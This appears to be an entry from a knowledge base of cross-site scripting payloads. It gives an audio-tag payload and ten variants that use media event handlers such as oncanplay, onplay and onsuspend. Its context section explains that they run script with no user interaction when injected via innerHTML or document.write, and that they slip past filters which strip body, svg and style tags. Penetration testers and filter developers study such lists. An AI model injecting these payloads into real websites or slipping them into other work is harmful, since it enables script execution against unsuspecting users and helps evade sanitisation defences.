---
title: Audio / Video Media Event Handlers (no interaction)
slug: audio-video-media-events
created_utc: 2026-05-12T00:00:00Z
updated_utc: 2026-05-12T00:00:00Z
tags: [payload, sink/dom-xss, sink/event-handler, sink/innerHTML]
inbound: []
---

# Audio / Video Media Event Handlers (no interaction)

## Payload

```html
<audio oncanplay=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>
```

## Variants

```html
<video oncanplaythrough=alert(1)><source src="validvideo.mp4" type="video/mp4"></video>
<audio controls ondurationchange=alert(1)><source src=validaudio.mp3 type=audio/mpeg></audio>
<audio controls autoplay onended=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>
<audio onloadeddata=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>
<audio autoplay onplay=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>
<audio autoplay onplaying=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>
<audio controls onsuspend=alert(1)><source src=validaudio.mp3 type=audio/mpeg></audio>
<audio controls loop muted autoplay onwaiting=alert(1)><source src=validaudio.mp3 type=audio/mpeg></audio>
<audio onwebkitplaybacktargetavailabilitychanged=alert(1)>
```

## Context

All variants fire without user interaction via media lifecycle events in the browser's HTMLMediaElement pipeline. Require a reachable audio/video source; if the URL 404s, `oncanplay` may not fire but `onsuspend` typically will. Injected via `innerHTML`/`document.write`. Useful when `<body>`, `<svg>`, and `<style>` tags are blocked or stripped. `onwebkitplaybacktargetavailabilitychanged` is Safari-specific (AirPlay available).

## Provenance

- Distilled from: `../../techniques/dom-xss/event-handler-matrix.md`
- Original source: `../../sources/portswigger-xss-cheatsheet.md`

## Linked techniques

- [Event Handler Matrix](../../techniques/dom-xss/event-handler-matrix.md)
